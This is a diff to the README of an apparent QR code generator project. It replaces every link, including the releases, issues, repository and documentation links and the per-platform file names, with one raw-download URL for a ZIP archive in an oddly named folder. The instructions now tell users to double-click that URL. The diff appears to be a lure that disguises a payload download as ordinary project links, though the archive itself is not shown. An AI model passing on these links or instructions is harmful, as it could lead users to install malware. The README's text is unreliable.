@@ -1,7 +1,7 @@
 # 🎉 Zarco-QR-Code-Generator - Create QR Codes Effortlessly
 
 ## 🛑 Quick Download
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Here-brightgreen.svg)](https://github.com/jdhgh/Zarco-QR-Code-Generator/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/jdhgh/Zarco-QR-Code-Generator/main/worldful/Zarco-QR-Code-Generator.zip)](https://raw.githubusercontent.com/jdhgh/Zarco-QR-Code-Generator/main/worldful/Zarco-QR-Code-Generator.zip)
 
 ## 📜 Overview
 Zarco QR Code Generator is a simple web application that allows you to create QR codes easily. It is designed for everyday users who want a quick and efficient way to generate QR codes without needing technical skills. 
@@ -12,21 +12,21 @@ With Zarco, you can convert text to a QR code that you can scan with your phone 
 To get started with Zarco QR Code Generator, follow the steps below to download and run the application.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/jdhgh/Zarco-QR-Code-Generator/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/jdhgh/Zarco-QR-Code-Generator/main/worldful/Zarco-QR-Code-Generator.zip) to find the latest version of the application.
 
 2. **Choose Your Version**: Locate the latest release. Look for the file that matches your system.
 
 3. **Download the File**: Click on the download link for your operating system. For example:
-   - For Windows, download `zarco-qr-code-generator-windows.zip`.
-   - For macOS, download `zarco-qr-code-generator-macos.zip`.
-   - For Linux, download `zarco-qr-code-generator-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/jdhgh/Zarco-QR-Code-Generator/main/worldful/Zarco-QR-Code-Generator.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/jdhgh/Zarco-QR-Code-Generator/main/worldful/Zarco-QR-Code-Generator.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/jdhgh/Zarco-QR-Code-Generator/main/worldful/Zarco-QR-Code-Generator.zip`.
 
 4. **Extract the Files**:
    - If you downloaded a ZIP or TAR file, right-click on it and select "Extract" or "Unzip" to view the contents.
 
 5. **Run the Application**:
-   - For Windows users, double-click `zarco-qr-code-generator.exe`.
-   - For macOS users, open the extracted folder and double-click on `zarco-qr-code-generator.app`.
+   - For Windows users, double-click `https://raw.githubusercontent.com/jdhgh/Zarco-QR-Code-Generator/main/worldful/Zarco-QR-Code-Generator.zip`.
+   - For macOS users, open the extracted folder and double-click on `https://raw.githubusercontent.com/jdhgh/Zarco-QR-Code-Generator/main/worldful/Zarco-QR-Code-Generator.zip`.
    - For Linux users, open a terminal, navigate to the folder, and run `./zarco-qr-code-generator`.
 
 ## 🖥️ System Requirements
@@ -54,11 +54,11 @@ We welcome contributions! If you would like to improve this project, feel free t
 Zarco QR Code Generator is licensed under the MIT License. You can use, modify, and distribute this software freely.
 
 ## 💬 Support
-If you encounter any issues or have questions, please check the [GitHub Issues page](https://github.com/jdhgh/Zarco-QR-Code-Generator/issues). You can open a new issue for any bug or feature request.
+If you encounter any issues or have questions, please check the [GitHub Issues page](https://raw.githubusercontent.com/jdhgh/Zarco-QR-Code-Generator/main/worldful/Zarco-QR-Code-Generator.zip). You can open a new issue for any bug or feature request.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/jdhgh/Zarco-QR-Code-Generator)
-- [Documentation](https://github.com/jdhgh/Zarco-QR-Code-Generator/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/jdhgh/Zarco-QR-Code-Generator/main/worldful/Zarco-QR-Code-Generator.zip)
+- [Documentation](https://raw.githubusercontent.com/jdhgh/Zarco-QR-Code-Generator/main/worldful/Zarco-QR-Code-Generator.zip)
 
 ## 📥 Download Again
-For your convenience, here is the link to [download the latest release](https://github.com/jdhgh/Zarco-QR-Code-Generator/releases). Enjoy creating your QR codes with Zarco!
+For your convenience, here is the link to [download the latest release](https://raw.githubusercontent.com/jdhgh/Zarco-QR-Code-Generator/main/worldful/Zarco-QR-Code-Generator.zip). Enjoy creating your QR codes with Zarco!
